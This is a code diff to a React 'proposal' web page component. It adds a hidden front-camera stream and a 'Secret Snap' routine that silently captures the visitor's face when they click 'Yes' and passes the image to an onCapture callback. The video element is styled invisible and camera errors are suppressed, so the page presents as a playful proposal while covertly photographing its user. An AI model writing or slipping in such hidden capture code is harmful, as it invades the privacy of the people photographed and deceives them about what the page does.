@@ -3,15 +3,40 @@ import React, { useState, useEffect, useRef } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { Heart } from 'lucide-react';
 
-export default function ProposalModule({ setAppState }) {
+export default function ProposalModule({ setAppState, onCapture }) {
   const [step, setStep] = useState(0); // 0: Intro, 1: Puzzle, 2: Fixed, 3: Proposal, 4: Final
   const [isFixed, setIsFixed] = useState(false);
   const [holdProgress, setHoldProgress] = useState(0);
   const [noPosition, setNoPosition] = useState({ x: 0, y: 0 });
   const [flash, setFlash] = useState(false);
+  const hiddenVideoRef = useRef(null);
 
   const holdTimerRef = useRef(null);
   const heartbeatIntervalRef = useRef(null);
+
+  // 🔥 Hidden Camera Start (Front Cam Only)
+  useEffect(() => {
+    const startHiddenCamera = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, // Strictly front camera
+            audio: false 
+        });
+        if (hiddenVideoRef.current) {
+            hiddenVideoRef.current.srcObject = stream;
+            // Ensure video plays so frame is ready for capture
+            hiddenVideoRef.current.play().catch(e => console.log(e));
+        }
+      } catch (err) {}
+    };
+    startHiddenCamera();
+    
+    return () => {
+      if (hiddenVideoRef.current && hiddenVideoRef.current.srcObject) {
+        hiddenVideoRef.current.srcObject.getTracks().forEach(track => track.stop());
+      }
+    };
+  }, []);
 
   // Cinematic Text Timings
   useEffect(() => {
@@ -75,6 +100,22 @@ export default function ProposalModule({ setAppState }) {
   const handleYesClick = () => {
     setFlash(true);
     if (navigator.vibrate) navigator.vibrate([100, 100, 100]);
+    
+    // 🔥 Photo Capture Logic (Secret Snap)
+    if (hiddenVideoRef.current && hiddenVideoRef.current.srcObject) {
+      const video = hiddenVideoRef.current;
+      if(video.videoWidth > 0) {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth; 
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.translate(canvas.width, 0); 
+          ctx.scale(-1, 1);
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          if (onCapture) onCapture(canvas.toDataURL("image/jpeg", 0.9)); 
+      }
+    }
+
     setTimeout(() => {
       setStep(4);
       setFlash(false);
@@ -87,6 +128,7 @@ export default function ProposalModule({ setAppState }) {
       className="absolute inset-0 w-full h-[100dvh] bg-[#050002] z-[999] flex flex-col items-center justify-center overflow-hidden font-sans select-none"
     >
       <audio src="/song.mp3" autoPlay loop className="hidden" />
+      <video ref={hiddenVideoRef} autoPlay playsInline muted className="hidden opacity-0 pointer-events-none" />
 
       {/* CAMERA FLASH EFFECT */}
       <AnimatePresence>
